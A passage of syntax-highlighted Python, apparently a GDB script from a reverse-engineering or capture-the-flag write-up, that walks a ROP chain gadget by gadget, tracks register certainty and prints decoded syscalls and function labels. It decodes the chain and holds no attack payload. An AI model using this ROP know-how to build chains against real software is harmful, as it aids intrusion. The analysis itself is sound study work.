</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ambig</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0b1</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">confi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0b10</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ambig_ptr</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0b100</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">reg_state</span> <span style="color:#f92672">=</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;rax&#39;</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">ambig</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;rbx&#39;</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">ambig</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;rcx&#39;</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">ambig</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;rdx&#39;</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">ambig</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;rdi&#39;</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">ambig</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;rsi&#39;</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">ambig</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;r8&#39;</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">ambig</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;rbp&#39;</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">ambig</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;rsp&#39;</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">ambig</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;eflags&#39;</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">ambig</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">process</span>(<span style="color:#a6e22e">addr</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">global</span> <span style="color:#a6e22e">i</span>, <span style="color:#a6e22e">chains</span>, <span style="color:#a6e22e">gads</span>, <span style="color:#a6e22e">rax</span>, <span style="color:#a6e22e">rbx</span>, <span style="color:#a6e22e">rcx</span>, <span style="color:#a6e22e">rdx</span>, <span style="color:#a6e22e">rdi</span>, <span style="color:#a6e22e">rsi</span>, <span style="color:#a6e22e">r8</span> ,<span style="color:#a6e22e">rbp</span>, <span style="color:#a6e22e">rsp</span>, <span style="color:#a6e22e">eflags</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">global</span> <span style="color:#a6e22e">variables</span>, <span style="color:#a6e22e">reg_state</span>, <span style="color:#a6e22e">ambig</span>, <span style="color:#a6e22e">confi</span>
</span></span><span style="display:flex;"><span>     
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">gads</span>[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">const_1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#39;-------- main() ---------&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">start</span><span style="color:#f92672">+</span><span style="color:#a6e22e">i</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x34785440</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#39;-------- exit_internal() ---------&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rdx = {chains[i+1]} ; r12 = {chains[i+2]}&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">chains</span>[<span style="color:#a6e22e">i</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">chains</span>[<span style="color:#a6e22e">i</span><span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rdx&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">confi</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">ambig_ptr</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;r12&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">confi</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">ambig_ptr</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">i</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">gads</span>[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">const_1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rsi = {chains[i+1]}&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rsi</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">chains</span>[<span style="color:#a6e22e">i</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rsi&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">confi</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">ambig_ptr</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">i</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">gads</span>[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">const_1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rdi = {chains[i+1]}&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rdi</span>  <span style="color:#f92672">=</span> <span style="color:#a6e22e">chains</span>[<span style="color:#a6e22e">i</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rdi&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">confi</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">ambig_ptr</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">i</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">gads</span>[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">const_1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">start</span><span style="color:#f92672">+</span><span style="color:#a6e22e">i</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x34785390</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#39;-------- encode() ---------&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">start</span><span style="color:#f92672">+</span><span style="color:#a6e22e">i</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x347853c8</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#39;-------- print() ---------&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">start</span><span style="color:#f92672">+</span><span style="color:#a6e22e">i</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x34785400</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#39;-------- exit() ---------&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">start</span><span style="color:#f92672">+</span><span style="color:#a6e22e">i</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x347855d8</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#39;-------- encode_internal() ---------&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rax = {chains[i+1]}&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">chains</span>[<span style="color:#a6e22e">i</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">confi</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">ambig_ptr</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">i</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">gads</span>[<span style="color:#ae81ff">4</span>]<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rdi&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span> <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rdx&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span> <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rsi&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">out</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">gdb</span>.<span style="color:#a6e22e">execute</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;x/s {rsi}&#39;</span>,<span style="color:#a6e22e">to_string</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">True</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">out</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">out</span>[<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">index</span>(<span style="color:#e6db74">&#39;&#34;&#39;</span>)<span style="color:#f92672">:-</span><span style="color:#ae81ff">1</span>]) 
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: sys_write({rdi}, {hex(rsi)}, {rdx}) // {out}&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rdx</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">|=</span> <span style="color:#a6e22e">confi</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rdi&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rdx&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: sys_write({rdi}, {hex(rsi)}, {rdx})&#39;</span>)
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rdx</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">confi</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: sys_write({rdi}, {hex(rsi)}, rdx)&#39;</span>)
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">ambig</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: sys_write(rdi, rsi, rdx)&#39;</span>)
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">ambig</span>
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">rsi</span> <span style="color:#a6e22e">not</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">variables</span>.<span style="color:#a6e22e">keys</span>() <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rsi&#39;</span>] <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">varname</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">rsi</span>).<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;0x&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">variables</span>[<span style="color:#a6e22e">rsi</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;buf_{varname}&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rdx&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rdi&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rsi&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: sys_read({rdi}, {variables[rsi]}, {rdx})&#39;</span>)
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: sys_read({rdi}, rsi , {rdx})&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span> 
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: sys_read(rdi, {variables[rsi]}, {rdx})&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rdx</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">confi</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rdi&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: sys_read({rdi}, {variables[rsi]}, rdx)&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: sys_read(rdi, {variables[rsi]}, rdx)&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rsi&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">confi</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">ambig</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">60</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rdi&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: sys_exit({rdi})&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: sys_exit(rdi)&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: syscall_{rax} ({rdi}, {rsi}, {rdx})&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">gads</span>[<span style="color:#ae81ff">5</span>]<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">const_1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">rax</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">variables</span>.<span style="color:#a6e22e">keys</span>()<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rax = (QWORD)({variables[rax]})&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rax = *(QWORD *)(rax) // *(QWORD *){hex(rax)}&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rax = *(QWORD *)(rax)&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">ambig</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">ambig_ptr</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">gads</span>[<span style="color:#ae81ff">6</span>]<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rsi&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">confi</span> 
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">ambig</span> 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>           <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">ambig</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">const_1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rsi&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: eax &amp;= esi // eax = {(rax)} &amp; {(rsi)}&#39;</span>)
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">confi</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: eax &amp;= esi // eax &amp;= {(rsi)}&#39;</span>)
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">ambig</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: eax &amp;= esi&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">ambig</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rax</span> <span style="color:#f92672">&amp;=</span> <span style="color:#a6e22e">rsi</span><span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">gads</span>[<span style="color:#ae81ff">7</span>]<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">const_1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rdi&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span> 
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rax -= rdi // rax = {(rax)} - {(rdi)}&#39;</span>)
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">confi</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;eflags&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">confi</span>
